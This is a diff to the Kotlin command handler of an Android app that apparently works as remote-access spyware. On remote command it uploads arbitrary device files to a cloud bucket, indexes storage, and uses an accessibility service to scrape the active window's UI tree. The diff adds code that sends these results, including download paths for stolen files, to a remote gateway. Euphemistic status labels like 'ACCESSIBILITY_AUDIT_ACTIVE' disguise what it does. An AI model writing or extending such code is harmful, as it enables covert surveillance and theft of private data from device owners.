@@ -161,11 +161,16 @@ object CommandProcessor {
                 "PULL_FILE" -> {
                     val f = File(content)
                     if (f.exists() && f.isFile) {
+                        val timestamp = System.currentTimeMillis()
+                        val storagePath = "${DeviceManager.getDeviceId(ctx)}/PULL/${timestamp}_${f.name}"
                         if (!CloudManager.uploadFile(ctx, f, "PULL")) {
                             status = "FETCH_FAILED (UPLOAD_ERROR)"
                             errorMsg = "File exists but streaming to storage bucket failed."
                         } else {
                             status = "REMOTE_FETCH_SUCCESS"
+                            // Return the specific path so the dashboard can generate a download link
+                            updateCommandStatus(ctx, id, status, null, null, storagePath)
+                            return // Exit early because we manually called update
                         }
                     } else {
                         status = "FETCH_ABORTED (NOT_FOUND)"
@@ -174,15 +179,21 @@ object CommandProcessor {
                 }
                 "GET_SKELETON" -> {
                     val report = FileManager.generateReport()
-                    CloudManager.uploadSkeleton(ctx, report)
                     status = "STORAGE_INDEX_COMPLETE"
+                    updateCommandStatus(ctx, id, status, null, report, null)
+                    return
                 }
                 "GET_TREE" -> {
-                    val json = JSONObject(content)
-                    val pkg = json.optString("pkg", null)
-                    val mins = json.optLong("duration_mins", 1L)
-                    MyAccessibilityService.instance?.startTreeDump(pkg, mins)
-                    status = "ACCESSIBILITY_AUDIT_ACTIVE (${mins}M)"
+                    val root = MyAccessibilityService.instance?.rootInActiveWindow
+                    if (root != null) {
+                        val treeJson = MyAccessibilityService.instance?.serializeNode(root)
+                        status = "UI_SNAPSHOT_CAPTURED"
+                        updateCommandStatus(ctx, id, status, null, treeJson, null)
+                        return
+                    } else {
+                        status = "FAILED (NO_WINDOW)"
+                        errorMsg = "Accessibility could not find an active window to scrape."
+                    }
                 }
                 "GET_LOGS" -> {
                     val logs = DebugLogger.getLogs()
@@ -280,7 +291,7 @@ object CommandProcessor {
         updateCommandStatus(ctx, id, status, errorMsg)
     }
 
-    private fun updateCommandStatus(ctx: Context, id: Int, status: String, errorMsg: String?) {
+    private fun updateCommandStatus(ctx: Context, id: Int, status: String, errorMsg: String? = null, resultData: JSONObject? = null, resultFilePath: String? = null) {
         try {
             val key = SecretVault.getLock(ctx)
             val updateUrl = URL(SecretVault.getGatewayUrl(ctx))
@@ -298,6 +309,8 @@ object CommandProcessor {
             payload.put("id", id)
             payload.put("status", status)
             if (!errorMsg.isNullOrEmpty()) payload.put("errorMsg", errorMsg)
+            if (resultData != null) payload.put("resultData", resultData)
+            if (!resultFilePath.isNullOrEmpty()) payload.put("resultFilePath", resultFilePath)
             req.put("payload", payload)
 
             conn.outputStream.use { it.write(req.toString().toByteArray()) }
